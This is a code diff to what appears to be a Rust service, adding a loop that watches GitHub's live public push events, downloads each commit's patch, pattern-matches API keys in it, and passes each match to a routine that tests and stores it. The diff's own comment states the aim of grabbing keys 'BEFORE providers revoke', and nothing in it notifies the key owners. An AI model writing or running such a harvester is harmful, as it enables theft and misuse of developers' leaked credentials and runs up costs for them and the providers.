@@ -270,6 +270,127 @@ async fn proxy_loop(state: Arc<AppState>) {
     }
 }
 
+// ----------------- REAL-TIME GITHUB EVENTS SCANNER (THE GAME CHANGER) -----------------
+async fn github_events_loop(state: Arc<AppState>) {
+    println!("[+] GitHub Events REAL-TIME Scanner Initialized!");
+    println!("[*] Strategy: Monitor live push events → fetch patches → extract keys BEFORE providers revoke");
+    
+    let client = Client::builder()
+        .user_agent("Mozilla/5.0 (compatible; SecurityResearch/1.0)")
+        .timeout(Duration::from_secs(15))
+        .build().unwrap();
+    
+    let mut seen_event_ids: HashSet<String> = HashSet::new();
+    let mut scan_count: u64 = 0;
+    let mut commits_scanned: u64 = 0;
+    let mut keys_found: u64 = 0;
+    
+    loop {
+        scan_count += 1;
+        
+        // Fetch latest public events from GitHub API
+        let events_url = "https://api.github.com/events?per_page=100";
+        
+        match client.get(events_url).send().await {
+            Ok(resp) => {
+                if resp.status().is_success() {
+                    match resp.json::<Vec<Value>>().await {
+                        Ok(events) => {
+                            let push_events: Vec<&Value> = events.iter()
+                                .filter(|e| e.get("type").and_then(|t| t.as_str()) == Some("PushEvent"))
+                                .filter(|e| {
+                                    if let Some(id) = e.get("id").and_then(|i| i.as_str()) {
+                                        !seen_event_ids.contains(id)
+                                    } else { false }
+                                })
+                                .collect();
+                            
+                            if !push_events.is_empty() {
+                                println!("[*] GitHub LIVE Scan #{}: {} new PushEvents found (total commits scanned: {}, keys found: {})", 
+                                    scan_count, push_events.len(), commits_scanned, keys_found);
+                            }
+                            
+                            for event in push_events.iter().take(20) {
+                                // Mark as seen
+                                if let Some(id) = event.get("id").and_then(|i| i.as_str()) {
+                                    seen_event_ids.insert(id.to_string());
+                                }
+                                
+                                // Get commits from payload
+                                if let Some(commits) = event.get("payload")
+                                    .and_then(|p| p.get("commits"))
+                                    .and_then(|c| c.as_array()) 
+                                {
+                                    let repo_name = event.get("repo")
+                                        .and_then(|r| r.get("name"))
+                                        .and_then(|n| n.as_str())
+                                        .unwrap_or("unknown");
+                                    
+                                    for commit in commits {
+                                        if let Some(sha) = commit.get("sha").and_then(|s| s.as_str()) {
+                                            commits_scanned += 1;
+                                            
+                                            // Fetch the actual commit patch from GitHub
+                                            let patch_url = format!("https://api.github.com/repos/{}/commits/{}", repo_name, sha);
+                                            
+                                            match client.get(&patch_url)
+                                                .header("Accept", "application/vnd.github.v3.patch")
+                                                .send().await 
+                                            {
+                                                Ok(patch_resp) => {
+                                                    if patch_resp.status().is_success() {
+                                                        if let Ok(patch_text) = patch_resp.text().await {
+                                                            // Scan the patch for API keys
+                                                            for pat in &state.patterns {
+                                                                for cap in pat.pattern.captures_iter(&patch_text) {
+                                                                    if let Some(m) = cap.get(1) {
+                                                                        let found_key = m.as_str().to_string();
+                                                                        keys_found += 1;
+                                                                        println!("[!!!] GITHUB LIVE CATCH: {} key in repo {} => {}...", 
+                                                                            pat.provider, repo_name, &found_key[..found_key.len().min(25)]);
+                                                                        tokio::spawn(test_and_store(
+                                                                            found_key, 
+                                                                            pat.provider.to_string(), 
+                                                                            Arc::clone(&state)
+                                                                        ));
+                                                                    }
+                                                                }
+                                                            }
+                                                        }
+                                                    }
+                                                },
+                                                Err(_) => {} // Skip failed patch fetches silently
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                            
+                            // Prevent memory leak: cap seen_event_ids at 5000
+                            if seen_event_ids.len() > 5000 {
+                                seen_event_ids.clear();
+                                println!("[~] GitHub Events: Cleared seen cache (memory optimization)");
+                            }
+                            
+                        },
+                        Err(e) => println!("[-] GitHub Events JSON parse error: {}", e),
+                    }
+                } else if resp.status().as_u16() == 403 {
+                    println!("[-] GitHub API rate limit hit. Sleeping 60s...");
+                    tokio::time::sleep(Duration::from_secs(60)).await;
+                    continue;
+                } else {
+                    println!("[-] GitHub Events HTTP {}", resp.status().as_u16());
+                }
+            },
+            Err(e) => println!("[-] GitHub Events connection error: {}", e),
+        }
+        
+        // Poll every 10 seconds (GitHub rate limit: 60 req/hr unauthenticated)
+        tokio::time::sleep(Duration::from_secs(10)).await;
+    }
+}
+
 // ----------------- AXUM WEB SERVER -----------------
 #[derive(Serialize)]
 struct StatsRecord { total: i64, living: i64 }
@@ -385,6 +506,7 @@ async fn main() {
 
     tokio::spawn(osint_loop(Arc::clone(&state)));
     tokio::spawn(proxy_loop(Arc::clone(&state)));
+    tokio::spawn(github_events_loop(Arc::clone(&state)));
 
     let app = Router::new()
         .fallback_service(ServeDir::new("public"))
